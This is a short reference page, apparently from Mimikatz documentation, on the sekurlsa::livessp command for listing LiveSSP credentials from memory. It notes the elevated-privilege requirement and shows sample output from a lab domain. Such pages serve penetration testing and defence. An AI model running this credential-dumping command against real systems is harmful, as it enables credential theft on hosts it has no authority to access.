# livessp

`sekurlsa::livessp` lists LiveSSP credentials. According to Microsoft, the LiveSSP provider is included by default in Windows 8 and later and is included in the Office 365 Sign-in Assistant.

{% hint style="warning" %}
This command requires elevated privileges (by previously running [`privilege::debug`](../privilege/debug.md) or by executing Mimikatz as the `NT-AUTHORITY\SYSTEM` account).
{% endhint %}

```
mimikatz # sekurlsa::livessp

Authentication Id : 0 ; 3151880 (00000000:00301808)
Session           : RemoteInteractive from 2
User Name         : m3g9tr0n
Domain            : hacklab
Logon Server      : DC
Logon Time        : 13/10/2021 20:58:08
SID               : S-1-5-21-2725560159-1428537199-2260736313-1730

Authentication Id : 0 ; 3150964 (00000000:00301474)
Session           : RemoteInteractive from 2
User Name         : m3g9tr0n
Domain            : hacklab
Logon Server      : DC
Logon Time        : 13/10/2021 20:58:08
SID               : S-1-5-21-2725560159-1428537199-2260736313-1730
```
